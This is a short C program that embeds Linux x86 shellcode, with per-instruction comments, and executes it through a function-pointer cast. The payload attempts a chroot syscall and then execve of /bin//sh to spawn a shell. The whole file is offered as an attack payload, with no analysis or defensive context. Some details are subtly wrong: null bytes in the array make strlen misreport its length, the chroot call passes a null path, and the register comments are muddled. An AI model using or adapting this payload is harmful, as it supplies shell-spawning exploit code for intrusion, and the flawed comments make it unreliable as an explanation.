#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
    "\x31\xdb"                  // xor ebx, ebx
    "\x31\xc9"                  // xor ecx, ecx
    "\x31\xd2"                  // xor edx, edx
    "\xb8\xa1\x00\x00\x00"      // mov eax, 161 (syscall number for chroot)
    "\xcd\x80"                  // int 0x80 (call syscall)

    "\x31\xc0"                  // xor eax, eax
    "\x50"                      // push eax (null terminator for argv)
    "\x68\x2f\x2f\x73\x68"      // push dword 0x68732f2f (//sh)
    "\x68\x2f\x62\x69\x6e"      // push dword 0x6e69622f (/bin)
    "\x89\xe3"                  // mov ebx, esp (set ebx to point to command string)
    "\x50"                      // push eax (null terminator for environment variables)
    "\x89\xe2"                  // mov ecx, esp (set ecx to point to environment variables)
    "\xb0\x0b"                  // mov al, 11 (syscall number for execve)
    "\xcd\x80";                 // int 0x80 (call syscall)

int main() {
    printf("Shellcode Length: %lu\n", strlen(shellcode));
    (*(void (*)()) shellcode)();
    return 0;
}
